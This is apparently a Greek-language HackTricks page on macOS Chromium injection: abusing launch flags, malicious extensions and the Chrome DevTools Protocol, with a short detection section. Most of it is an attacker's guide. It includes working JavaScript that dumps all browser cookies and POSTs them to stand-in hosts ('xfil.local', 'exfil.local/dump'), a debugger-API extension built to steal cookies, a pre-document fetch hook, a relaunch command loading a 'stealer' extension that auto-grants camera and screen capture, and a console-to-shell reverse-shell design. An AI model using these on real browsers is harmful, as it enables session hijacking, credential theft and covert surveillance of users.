# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

Οι browsers που βασίζονται στο Chromium, όπως οι Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi και Opera, χρησιμοποιούν όλοι τα ίδια command-line switches, preference files και DevTools automation interfaces. Στο macOS, οποιοσδήποτε χρήστης με GUI access μπορεί να τερματίσει μια υπάρχουσα συνεδρία browser και να την ανοίξει ξανά με αυθαίρετα flags, extensions ή DevTools endpoints που εκτελούνται με τα entitlements του στόχου.

#### Εκκίνηση του Chromium με custom flags στο macOS

Το macOS διατηρεί ένα μόνο UI instance ανά Chromium profile, επομένως το instrumentation συνήθως απαιτεί force-closing του browser (για παράδειγμα με `osascript -e 'tell application "Google Chrome" to quit'`). Οι attackers συνήθως κάνουν relaunch μέσω `open -na "Google Chrome" --args <flags>`, ώστε να κάνουν inject arguments χωρίς να τροποποιήσουν το app bundle. Η τοποθέτηση αυτής της εντολής μέσα σε ένα user LaunchAgent (`~/Library/LaunchAgents/*.plist`) ή login hook εγγυάται ότι ο tampered browser θα επανεκκινείται μετά από reboot/logoff.

#### `--load-extension` Flag

Το `--load-extension` flag φορτώνει αυτόματα unpacked extensions (διαδρομές διαχωρισμένες με κόμμα). Συνδύασέ το με το `--disable-extensions-except` για να μπλοκάρεις τα legitimate extensions, επιβάλλοντας την εκτέλεση μόνο του payload σου. Τα malicious extensions μπορούν να ζητήσουν permissions υψηλού αντίκτυπου, όπως `debugger`, `webRequest` και `cookies`, ώστε να κάνουν pivot σε DevTools protocols, να τροποποιούν CSP headers, να υποβαθμίζουν το HTTPS ή να κάνουν exfiltrate session material αμέσως μόλις ξεκινήσει ο browser.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Αυτά τα switches εκθέτουν το Chrome DevTools Protocol (CDP) μέσω TCP ή pipe, ώστε εξωτερικά εργαλεία να μπορούν να ελέγχουν τον browser. Η Google παρατήρησε εκτεταμένη abuse από infostealers αυτού του interface και, από το Chrome 136 (Μάρτιος 2025), τα switches αγνοούνται για το default profile, εκτός αν ο browser εκκινηθεί με ένα μη τυπικό `--user-data-dir`. Αυτό επιβάλλει το App-Bound Encryption σε πραγματικά profiles, όμως οι attackers μπορούν ακόμη να δημιουργήσουν ένα fresh profile, να εξαναγκάσουν το θύμα να κάνει authenticate μέσα σε αυτό (phishing/triage assistance) και να συλλέξουν cookies, tokens, device trust states ή WebAuthn registrations μέσω CDP.

#### `--user-data-dir` Flag

Αυτό το flag ανακατευθύνει ολόκληρο το browser profile (History, Cookies, Login Data, Preference files κ.λπ.) σε path που ελέγχει ο attacker. Είναι υποχρεωτικό όταν συνδυάζονται σύγχρονα Chrome builds με `--remote-debugging-port` και διατηρεί επίσης το tampered profile απομονωμένο, ώστε να μπορείς να τοποθετήσεις προ-συμπληρωμένα αρχεία `Preferences` ή `Secure Preferences` που απενεργοποιούν security prompts, εγκαθιστούν αυτόματα extensions και αλλάζουν τα default schemes.

#### `--use-fake-ui-for-media-stream` Flag

Αυτό το switch παρακάμπτει το permission prompt για camera/mic, ώστε οποιαδήποτε σελίδα καλεί το `getUserMedia` να αποκτά αμέσως πρόσβαση. Συνδύασέ το με flags όπως `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` ή CDP `Browser.grantPermissions` commands, για να καταγράφεις αθόρυβα audio/video, να κάνεις desk-share ή να ικανοποιείς WebRTC permission checks χωρίς αλληλεπίδραση με τον χρήστη.

## Delivery & Relaunch Patterns Seen in the Wild

Η abuse του CDP αποτελεί συνήθως στάδιο **post-exploitation** και όχι το αρχικό payload. Μια πρόσφατη campaign στο macOS που στόχευε developers χρησιμοποίησε ένα poisoned Xcode **`Run Script` build phase** (`PBXShellScriptBuildPhase`), ώστε ο κώδικας να εκτελείται μόνο όταν το θύμα έκανε **build** του project και όχι όταν απλώς το έκανε clone ή το άνοιγε. Μετά την πρώτη εκτέλεση, το malware μόλυνε επίσης άλλα `.xcodeproj` trees, πρόσθεσε malicious Git `pre-commit` hooks και αναζήτησε περισσότερα Xcode projects μέσα σε ZIP archives.

Για την abuse του Chromium, αυτό έχει σημασία επειδή ο attacker δεν χρειάζεται να τροποποιήσει το browser binary. Ένας short-lived build-phase / `osascript` stager μπορεί αντί γι' αυτό να εγκαταστήσει ένα **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher κ.λπ.), το οποίο ανοίγει ξανά τον legitimate browser με flags που ελέγχει ο attacker κάθε φορά που ο χρήστης τον εκκινεί.

> [!TIP]
> Σε developer endpoints, έλεγξε αρχεία `.pbxproj`, `.git/hooks/pre-commit` και ZIPs που περιέχουν `.xcodeproj` για μη αναμενόμενα `curl`, `osascript`, `xxd`, nested `base64` ή logic για relaunch του Chrome.

## Remote Debugging & DevTools Protocol Abuse

Μόλις το Chrome ανοίξει ξανά με ένα dedicated `--user-data-dir` και `--remote-debugging-port`, μπορείς να συνδεθείς μέσω CDP (π.χ. με `chrome-remote-interface`, `puppeteer` ή `playwright`) και να κάνεις script workflows υψηλών privileges:

- **Cookie/session theft:** Τα `Network.getAllCookies` και `Storage.getCookies` επιστρέφουν HttpOnly values ακόμη και όταν το App-Bound encryption κανονικά θα μπλόκαρε την πρόσβαση στο filesystem, επειδή το CDP ζητά από τον browser που εκτελείται να τα κάνει decrypt.
- **Permission tampering:** Τα `Browser.grantPermissions` και `Emulation.setGeolocationOverride` επιτρέπουν την παράκαμψη prompts για camera/mic (ιδιαίτερα σε συνδυασμό με το `--use-fake-ui-for-media-stream`) ή την παραποίηση security checks που βασίζονται στην τοποθεσία.
- **Keystroke/script injection:** Το `Runtime.evaluate` εκτελεί αυθαίρετη JavaScript μέσα στο active tab, επιτρέποντας credential lifting, DOM patching ή injection persistence beacons που επιβιώνουν από navigation.
- **Live exfiltration:** Τα `Network.webRequestWillBeSentExtraInfo` και `Fetch.enable` intercept authenticated requests/responses σε πραγματικό χρόνο, χωρίς να αγγίζουν artifacts στο disk.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Επειδή το Chrome 136 αποκλείει το CDP στο default profile, η αντιγραφή του υπάρχοντος καταλόγου `~/Library/Application Support/Google/Chrome` του θύματος σε staging path δεν επιστρέφει πλέον decrypted cookies. Αντί γι' αυτό, κάντε social-engineer τον χρήστη ώστε να πραγματοποιήσει authentication μέσα στο instrumented profile (π.χ. σε μια «χρήσιμη» support session) ή καταγράψτε MFA tokens in transit μέσω CDP-controlled network hooks.

### XCSSET-style CDP Backdoor Chain

Ένα πρακτικό malware pattern είναι:

1. Κάντε restart το userland implant ή wrapper κάθε φορά που εκκινείται το Chrome.
2. Εκκινήστε τον legitimate browser με `--remote-debugging-port=<port>` και, στο Chrome 136+, συνήθως με ένα paired non-default `--user-data-dir=<dir>`.
3. Εκκινήστε ένα helper που συνδέεται στο local CDP WebSocket και καταχωρίζει ένα pre-document hook με `Page.addScriptToEvaluateOnNewDocument`.

Αυτό το helper μπορεί να κάνει inject JavaScript **πριν** εκτελεστεί ο κώδικας του site, κάτι που είναι ιδανικό για hooking των `window.fetch`, `XMLHttpRequest`, wallet providers ή autofill flows χωρίς patching αρχείων στον δίσκο.
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Μια ισχυρότερη παραλλαγή μετατρέπει τον browser σε **host command bridge**: injected JavaScript εκπέμπει ένα `console.log` με delimiter, το τοπικό helper παρακολουθεί το `Runtime.consoleAPICalled`, αφαιρεί το marker, εκτελεί το υπόλοιπο μέσω του host shell (για παράδειγμα με το `exec.Command` της Go) και επιστρέφει τα stdout/stderr μέσω του WebSocket του attacker. Αυτό αναβαθμίζει την εκτέλεση script σε επίπεδο tab σε ένα ως επί το πλείστον fileless reverse shell.

## Injection μέσω Extension μέσω Debugger API

Η έρευνα του 2023 με τίτλο "Chrowned by an Extension" απέδειξε ότι ένα malicious extension που χρησιμοποιεί το `chrome.debugger` API μπορεί να συνδεθεί σε οποιοδήποτε tab και να αποκτήσει τις ίδιες δυνατότητες DevTools με το `--remote-debugging-port`. Αυτό καταρρίπτει τις αρχικές υποθέσεις απομόνωσης (τα extensions παραμένουν στο δικό τους context) και επιτρέπει:

- Αθόρυβη κλοπή cookies και credentials με τα `Network.getAllCookies`/`Fetch.getResponseBody`.
- Τροποποίηση των site permissions (camera, microphone, geolocation) και παράκαμψη security interstitials, επιτρέποντας σε phishing pages να υποδύονται τα παράθυρα διαλόγου του Chrome.
- On-path tampering σε TLS warnings, downloads ή WebAuthn prompts μέσω προγραμματιστικού χειρισμού των `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` ή `Security.handleCertificateError`.

Φορτώστε το extension με τα `--load-extension`/`--disable-extensions-except`, ώστε να μην απαιτείται καμία αλληλεπίδραση από τον χρήστη. Ένα ελάχιστο background script που weaponizes το API έχει την εξής μορφή:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Η extension μπορεί επίσης να κάνει subscribe σε events `Debugger.paused` για να διαβάζει JavaScript variables, να κάνει patch σε inline scripts ή να προσθέτει custom breakpoints που επιβιώνουν από την πλοήγηση. Επειδή όλα εκτελούνται μέσα στο GUI session του χρήστη, τα Gatekeeper και TCC δεν ενεργοποιούνται, καθιστώντας αυτή την τεχνική ιδανική για malware που έχει ήδη επιτύχει execution στο context του χρήστη.

## Εντοπισμός & Hunting

- Δημιουργήστε alert για Chromium browsers που εκκινούν με `--remote-debugging-port`, `--remote-debugging-pipe` ή ύποπτο `--user-data-dir`, ειδικά όταν ο parent είναι `bash`, `sh`, `osascript`, `xcodebuild` ή ένας LaunchAgent helper.
- Αναζητήστε σύντομες αλυσίδες όπου ένας helper ανοίγει ένα local CDP WebSocket, κάνει register το `Page.addScriptToEvaluateOnNewDocument` και στη συνέχεια δημιουργεί μια long-lived outbound WebSocket/HTTPS connection.
- Κάντε hunting για console-to-shell bridges, συσχετίζοντας activity του browser `Runtime.consoleAPICalled` με child shells ή helper processes που εκτελούν attacker-supplied commands.
- Σε developer Macs, ελέγξτε entries `PBXShellScriptBuildPhase` σε αρχεία `.pbxproj`, Git `pre-commit` hooks, Dock/login item relaunchers και Xcode projects που περιέχονται σε ZIP για browser wrapper installation.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Εργαλεία

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Αυτοματοποιεί την εκκίνηση του Chromium με payload extensions και εκθέτει διαδραστικά CDP hooks.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Παρόμοιο εργαλείο, εστιασμένο στην interception της κίνησης και στο browser instrumentation για macOS operators.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Βιβλιοθήκη Node.js για scripting σε dumps του Chrome DevTools Protocol (cookies, DOM, permissions), όταν ένα instance με `--remote-debugging-port` βρίσκεται σε λειτουργία.

### Παράδειγμα
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Βρείτε περισσότερα παραδείγματα στους συνδέσμους των tools.

## Αναφορές

- [https://chromedevtools.github.io/devtools-protocol/v8/Runtime/](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [https://chromedevtools.github.io/devtools-protocol/tot/Page/](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
